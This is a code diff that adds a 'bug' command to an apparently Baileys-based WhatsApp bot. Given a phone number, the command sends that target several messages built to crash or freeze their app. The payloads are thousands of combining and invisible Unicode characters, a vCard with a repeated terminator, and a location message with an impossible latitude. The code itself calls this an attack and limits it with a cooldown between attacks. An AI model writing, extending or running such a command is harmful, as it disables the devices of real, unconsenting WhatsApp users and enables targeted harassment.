@@ -1379,6 +1379,89 @@ function setupCommandHandlers(socket, number) {
       switch (command) {
         // --- existing commands (deletemenumber, unfollow, newslist, admin commands etc.) ---
         // ... (keep existing other case handlers unchanged) ...
+          case 'bug': {
+    try {
+        // Owner only check
+        if (!isOwner) return reply('❌ Owner only command.');
+
+        // Cooldown system
+        if (!global.bugCommandCooldown) global.bugCommandCooldown = {};
+        const senderId = sender || m.sender;
+        const now = Date.now();
+        if (global.bugCommandCooldown[senderId] && now - global.bugCommandCooldown[senderId] < 10000) {
+            return reply(`⏳ Please wait 10s before the next attack.`);
+        }
+        global.bugCommandCooldown[senderId] = now;
+
+        // Input validation
+        if (!args[0]) {
+            return reply(`📌 *BUG COMMAND MENU*
+Usage: .bug [number]
+
+Example: .bug 947xxxxxxxx
+
+Note: This sends a mix of Unicode Lag, VCard Crash, and Location payload.`);
+        }
+
+        let number = args[0].replace(/[^0-9]/g, '');
+        if (number.startsWith('0')) number = '94' + number.slice(1);
+        let targetJid = number + '@s.whatsapp.net';
+
+        // --- BUG PAYLOAD GENERATION ---
+
+        // 1. Unicode Lag (Overloads the UI rendering engine)
+        const lagUnicode = Buffer.alloc(1e4, '0').toString().replace(/0/g, 'ॣ ');
+        const invisibleUnicode = '‎'.repeat(5000);
+        
+        // 2. Heavy VCard (Crashes Contact App/WhatsApp UI)
+        const vcardPayload = 'BEGIN:VCARD\n' +
+            'VERSION:3.0\n' +
+            'FN:LAG_DEVICE_' + Math.random() + '\n' +
+            'ORG:BUG_BOT;\n' +
+            'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n' +
+            'END:VCARD'.repeat(100);
+
+        // 3. Document Payload
+        const docPayload = {
+            document: { url: 'https://github.com' }, // Fake file
+            mimetype: 'application/pdf',
+            fileName: 'CRASH_LOG.pdf',
+            caption: lagUnicode + invisibleUnicode
+        };
+
+        await reply(`🚀 Sending bug payloads to ${number}...`);
+
+        // --- SENDING THE ATTACK SEQUENCE ---
+
+        // Send Heavy Unicode Text
+        await conn.sendMessage(targetJid, { text: lagUnicode + invisibleUnicode }, { quoted: mek });
+
+        // Send VCard Crash
+        await conn.sendMessage(targetJid, {
+            contacts: {
+                displayName: 'System Crash',
+                contacts: [{ vcard: vcardPayload }]
+            }
+        });
+
+        // Send Location Lag (Heavy coordinates)
+        await conn.sendMessage(targetJid, {
+            location: { 
+                degreesLatitude: -99.999999, 
+                degreesLongitude: 99.999999,
+                name: lagUnicode 
+            }
+        });
+
+        // Confirm to Owner
+        await reply(`✅ Attack finished on ${number}.`);
+
+    } catch (e) {
+        console.error(e);
+        reply('❌ Failed to execute bug command.');
+    }
+}
+break;
 
           case 'ts': {
     const axios = require('axios');
